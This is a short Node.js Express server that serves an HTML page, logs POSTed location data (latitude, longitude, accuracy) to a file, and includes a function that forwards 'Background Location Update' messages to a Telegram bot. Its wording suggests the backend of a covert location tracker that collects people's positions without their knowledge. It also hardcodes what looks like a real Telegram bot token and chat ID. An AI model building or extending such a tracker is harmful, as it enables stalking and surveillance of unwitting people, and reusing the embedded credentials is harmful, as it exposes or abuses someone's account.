const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 5000;

// Middleware
app.use(bodyParser.json());

// Track endpoint
app.post('/track', (req, res) => {
    const locationData = req.body;
    const logEntry = `${new Date().toISOString()} - ${JSON.stringify(locationData)}\n`;
    
    // Log to file
    fs.appendFile('locations.log', logEntry, (err) => {
        if (err) console.error('Error writing to log file:', err);
    });
    
    // You can also send to Telegram here if needed
    // sendToTelegram(locationData);
    
    res.status(200).send('Location received');
});

// Serve the HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
});

// Function to send to Telegram (optional)
async function sendToTelegram(locationData) {
    const BOT_TOKEN = "7659085089:AAGTE5B4NRLG_tFvbfYayfrG0URgFgXnv5w";
    const CHAT_ID = "6319619567";
    
    const message = `📍 **Background Location Update**  
Latitude: ${locationData.latitude}  
Longitude: ${locationData.longitude}  
Accuracy: ${locationData.accuracy}m  
Time: ${new Date().toLocaleString()}`;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        const data = await response.json();
        if (!data.ok) {
            console.error('Telegram API error:', data.description);
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
    }
}
